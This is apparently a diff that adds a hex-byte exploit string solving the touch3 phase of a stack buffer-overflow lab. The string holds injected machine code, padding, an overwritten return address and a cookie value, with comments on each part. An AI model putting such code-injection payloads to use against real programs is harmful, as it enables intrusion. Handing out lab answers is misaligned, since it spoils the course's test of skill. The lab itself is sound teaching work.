@@ -1,0 +1,6 @@
+48 c7 c7 d0 05 61 55 c3 /* Dissasembled $rsp + 0x28, add 40 bytes to stack top where we can find cookie in ASCII. */
+00 00 00 00 00 00 00 00 /* Padding to set return address in proper place. */
+00 00 00 00 00 00 00 00 
+a8 05 61 55 00 00 00 00 /* $rsp address. */
+2d 19 40 00 00 00 00 00 /* touch3 address. */
+37 30 31 38 37 31 39 36 /* Cookie 0x70187196 in ASCII (added withou 0x). */
